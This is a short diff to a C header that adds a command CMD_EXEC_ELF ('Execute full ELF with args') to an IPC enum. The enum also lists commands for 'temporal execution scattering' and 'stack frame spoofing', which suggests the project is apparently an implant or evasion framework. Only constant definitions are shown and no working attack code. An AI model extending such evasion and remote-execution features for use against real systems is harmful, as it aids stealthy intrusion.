@@ -81,8 +81,9 @@ typedef enum {
     CMD_REKEY            = 0x09,
     CMD_STATUS_QUERY     = 0x0A,
     CMD_WATCHDOG_ALERT   = 0x0B,
-    CMD_SCATTER_EXEC     = 0x0C,  /* Temporal execution scattering          */
+        CMD_SCATTER_EXEC     = 0x0C,  /* Temporal execution scattering          */
     CMD_STACK_SPOOF      = 0x0D,  /* Stack frame spoofing activation        */
+    CMD_EXEC_ELF         = 0x0E,  /* Execute full ELF with args             */
 } aegis_ipc_cmd_t;
 
 /* ── Structures ──────────────────────────────────────────────────────────── */
